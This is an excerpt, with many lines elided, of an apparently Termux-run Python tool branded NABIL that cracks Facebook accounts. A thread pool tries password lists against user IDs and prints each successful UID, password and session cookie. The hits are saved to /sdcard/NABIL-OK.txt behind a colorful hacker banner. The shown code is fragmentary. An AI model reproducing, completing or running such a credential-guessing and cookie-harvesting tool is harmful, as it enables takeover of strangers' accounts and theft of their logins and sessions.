...
ha = current.day
today = date.today()
#NABIL2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mNABIL')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-NABIL/1.2.0 OPN-B'
...
psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mWELCOME TO MY TOOLS  '+name)
print('')
...
def banner():
    clear()
    print(f"""\033[1;92m
 \033[1;31m    __  _      ___   _____  __        __   ___  
\033[1;32m /\ \ \/_\    / __\  \_   \/ /       / /_ / _ \ 
 \033[1;33m /  \/ //_\\  /__\//   / /\/ /  _____| '_ \ (_) |
 \033[1;34m/ /\  /  _  \/ \/  \/\/ /_/ /__|_____| (_) \__, |
 \033[1;31m\_\ \/\_/ \_/\_____/\____/\____/      \___/  /_/ 
                                                 
                                                 

 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mNABIL\033[1;92m| 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mMD MONIR HOSSAIN\033[1;92m|   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/HACKER.xude.manush.kori.vai')
       main()  
...
def sh6():
  ...
  #  linex()
    ...
    with ThreadPool(max_workers=80) as manshera:    
        ...
        print(f"{P}[{H}•{P}]{WHITE}WElCOME TO MY TOOLS     : {GREEN}"+name)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio NABIL_OK.mp3")
                print('\033[1;92m[NABIL-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/NABIL-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mNABIL","\x1b[1;92mNABIL","\x1b[1;93mNABIL","\x1b[1;94mNABIL","\x1b[1;95mNABIL","\x1b[1;96mNABIL","\x1b[1;97mNABIL","\x1b[1;91mNABIL","\x1b[1;92mNABIL","\x1b[1;93mNABIL","\x1b[1;94mNABIL","\x1b[1;95mNABIL","\x1b[1;96mNABIL"])
